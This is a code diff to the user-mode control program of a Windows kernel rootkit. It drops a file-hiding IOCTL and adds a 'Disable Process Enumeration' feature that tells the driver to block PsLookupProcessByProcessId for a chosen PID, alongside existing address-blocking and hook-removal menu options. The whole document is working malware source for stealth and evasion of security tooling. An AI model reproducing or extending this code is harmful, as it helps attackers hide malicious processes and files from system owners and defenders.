@@ -44,12 +44,8 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x708, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG BlockAddress =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x709, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
-        /*
-        constexpr ULONG HookNtCreateFile =
+        constexpr ULONG BlockPIDAccess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x710, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
-            */
-        constexpr ULONG HookNtQueryDirectoryFile =
-            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x711, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG DeleteAllHooks =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
@@ -81,18 +77,13 @@ namespace Rootkit {
         );
 
     }
-    
-    bool HideFile(HANDLE driver_handle, WCHAR* Filename) {
+
+    bool DisableProcessEnum(HANDLE driver_handle, UINT32 PID) {
         Request r;
-        wcsncpy_s(
-            r.Filename,
-            _countof(r.Filename),        // size of r.Path in WCHARs
-            Filename,                    // source
-            _TRUNCATE                // max to copy
-        );
+        r.process_id = UlongToHandle(PID);
         return DeviceIoControl(
             driver_handle,
-            codes::HookNtQueryDirectoryFile,
+            codes::BlockPIDAccess,
             &r,
             sizeof(r),
             &r,
@@ -808,7 +799,7 @@ int main() {
                 system("cls");
                 std::cout << "=== HOOKING UTILS ===\n";
                 std::cout << "1. Block Address Ranges\n";
-                std::cout << "2. Hide File\n";
+                std::cout << "2. Disable Process Enumeration -- Disables PsLookupProcessByProcessId for the PID -- NOTE: ANY KERNEL FUNCTION THAT USES THIS WONT BE ABLE TO INTERACT WITH THE PROCESS, Including this rootkit.\n";
                 std::cout << "3. Delete all hooks and revert.\n";
                 std::cout << "===========================\n";
                 std::cout << "Enter a choice: ";
@@ -824,10 +815,9 @@ int main() {
                     break;
                 case 2:
                     std::wcin.ignore();
-                    std::wcout << L"Enter the filename you would like to hide: ";
-                    std::wcin.getline(FilePath, 256);
-                    std::wcout << L"\n[!] Sending Message to Driver.\n";
-                    Rootkit::HideFile(driver_handle, FilePath); //TODO: Instead of filtering by filename, filter by full path.
+                    std::cout << "Enter a PID: ";
+                    std::cin >> pidProtect;
+                    Rootkit::DisableProcessEnum(driver_handle, pidProtect);
                     Sleep(5000);
                     break;
                 case 3:
